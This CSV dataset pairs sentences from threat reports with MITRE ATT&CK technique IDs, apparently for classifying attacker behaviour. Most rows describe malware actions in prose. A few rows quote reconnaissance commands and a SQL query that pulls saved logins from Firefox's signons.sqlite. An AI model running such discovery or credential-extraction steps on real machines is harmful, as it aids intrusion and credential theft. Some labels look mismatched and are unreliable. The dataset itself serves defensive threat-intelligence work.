text,label
has used a reconnaissance module to gather information about the operating system and hardware on the infected host.,T1082
has the ability to modify the Registry key HKCU\Software\ApplicationContainer\Appsw64 to store information regarding the C2 server and downloads.(Citation: Cybereason Valak May 2020)(Citation: Unit 42 Valak July 2020),T1112
"The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory",T1140
Detect and identify source IP,T1016
has created a new registry entry at HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics with a value of C:\ProgramData\Initech\Initech.exe /run.,T1547.001
queries the Registry for keys and values.,T1012
has downloaded additional tools including  directly to endpoints.,T1105
can be decrypted in memory using a Lightweight Encryption Algorithm (LEA)-128 key and decoded using a XOR key.,T1140
injecting it into ieinstall.exe,T1055
systeminfo,T1082
Several  malware families install themselves as new services.(Citation: Novetta Blockbuster),T1543.003
obfuscating malicious elements.,T1027
actors used the following commands after exploiting a machine with  malware to obtain information about the OS: ver >> %temp%\download systeminfo >> %temp%\download,T1082
decodes Base64 strings and decrypts strings using a custom XOR algorithm.,T1140
the malware retrieves information on the infected machine and sends it to the C&C encrypted with DES.,T1573.001
includes various modules to attempt to bypass UAC for escalation of privileges.,T1548.002
can inject code into system processes including notepad.exe svchost.exe and vbc.exe.,T1055
checks the victim OS version after executing to determine where to drop files based on whether the victim is 32-bit or 64-bit.,T1082
has been packed with a custom packer to hide payloads.(Citation: ZScaler Squirrelwaffle Sep 2021),T1027
has used run-only Applescripts a compiled and stripped version of  to remove human readable indicators to evade detection.,T1027
The malware was injected into a SVCHOST process where a driver location pointed to the config file,T1055
used whoami and query user to obtain information about the victim user.,T1033
"Threat actors used explorer.exe, where they were previously injected into, to initiate a proxied RDP connection to a server:",T1021.001
remote shell functions.,T1059.003
can upload files from a victim's machine.,T1005
The default configuration allows unprivileged users to query group membership of local administrator groups,T1078
creates a backdoor through which remote attackers can download files onto a compromised host.,T1105
uses a custom algorithm which XOR’s multiple values together.,T1027
decrypts configuration data as well as decrypts and unpacks the legitimate PsExec utility,T1140
can change Internet Explorer settings to reduce warnings about malware activity.,T1562.001
installer plugin can schedule rundll32.exe to load the dispatcher.,T1218.011
has used  a RAT that uses HTTP to communicate.,T1071.001
it also tries to delete the wp-sale.js file,T1070.004
performs the injection by attaching its code into the APC queue using NtQueueApcThread API.,T1055
searches for different processes on the system.,T1057
The ISO files that X-Force observed contained a LNK file,T1027
uses a script to automate tasks on the victim's machine and to assist in execution.,T1059.003
proxy,T1090
the threat actors dropped several batch scripts on the server:,T1059.003
exfiltrates data stolen from a system over its C2 channel.,T1041
can gather information regarding the user.,T1033
has used tools that communicate with C2 over HTTP.,T1071.001
Storing the ransomware within a 7zip encrypted archive,T1027
this key is typically obfuscated with AES 256 encryption.,T1027
has used multi-stage packers for exploit code.,T1027
by brute-forcing them,T1110
"It also attempts to issue the following SQL query on the “signons.sqlite” file: “SELECT hostname, encryptedUsername, encryptedPassword FROM moz_logins WHERE timePasswordChanged/1000 BETWEEN ? AND ?”   117 ftpUpload Uses FTPManager:uploadFile method and a supplied server name, username and password",T1033
can execute ipconfig on the victims machine.(Citation: Unit 42 Bisonal July 2018)(Citation: Kaspersky CactusPete Aug 2020) ,T1016
A  variant can communicate with its C2 servers by using HTTPS.,T1071.001
Process injection was observed during the intrusion,T1055
has used malware that adds cryptocurrency miners as a service.,T1543.003
actors used compromised domain credentials for the victim's endpoint management platform Altiris to move laterally.,T1078
is distributed as a set of encrypted files and scripts.,T1027
binds to a raw socket on a random source port between 31800 and 31900 for C2.,T1095
has been created with a hidden attribute to insure it's not visible to the victim.,T1564.001
has used MSI files to download additional files to execute.(Citation: Medium Metamorfo Apr 2020)(Citation: FireEye Metamorfo Apr 2018)(Citation: Fortinet Metamorfo Feb 2020) ,T1105
has the ability to download and execute additional payloads.(Citation: BlackBerry CostaRicto November 2020)(Citation: FireEye FiveHands April 2021),T1105
The identical encrypted file,T1027
can search for specific files and list directories.,T1083
Windows discovery commands,T1059.003
"It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file",T1105
can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.,T1033
collected the victim's username and executed the whoami command on the victim's machine.  executed shellcode to collect the username on the victim's machine. (Citation: FireEye APT32 April 2020)(Citation: ESET OceanLotus),T1033
Remote Task Creation/Update using Schtasks Process,T1053.005
can enumerate the username on a compromised host.,T1033
has collected the victims external IP address.,T1016
can collect data from a compromised host.(Citation: Profero APT27 December 2020),T1005
One variant of  uses HTTP and HTTPS for C2.,T1071.001
has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater May 2019)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)(Citation: DHS CISA AA22-055A MuddyWater February 2022) ,T1204.002
Microsoft Windows Defender AntiVirus Protection disabled,T1562.001
has used  nodes for C2 traffic.,T1090
collects the network adapter information and domain/username information based on current remote sessions.,T1016
has sent collected data from a compromised host to its C2 servers.,T1041
has been packed for obfuscation.,T1027
bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).,T1548.002
"DLL sideloading scenario, the malicious loader (ffmpeg.dll) would replace the clean dependency;",T1574.002
"its “intelligent” way of brute forcing: it checks the prompt and, based on the prompt, it selects the appropriate credentials.",T1110
can upload data from the victim's machine to the C2 server.,T1005
The encoded payload was a Cobalt Strike httpsstager that was injected into the PowerShell process that ran the command,T1055
cyber actors have also been observed modifying group policies for password exploitation.,T1484.001
threat actors use their beacon sessions to establish RDP access,T1021.001
deletes its original installer file once installation is complete.,T1070.004
Keylogging,T1056.001
Operates as a file grabber,T1105
"The dropper configures
the backdoor with a C2 server address, RC4 encryption key,",T1573.001
has sent data related to a compromise host over its C2 channel.,T1041
contains keylogging functionality that will monitor for active application windows and write them to the log it can handle special characters and it will buffer by default 50 characters before sending them out over the C2 infrastructure.,T1056.001
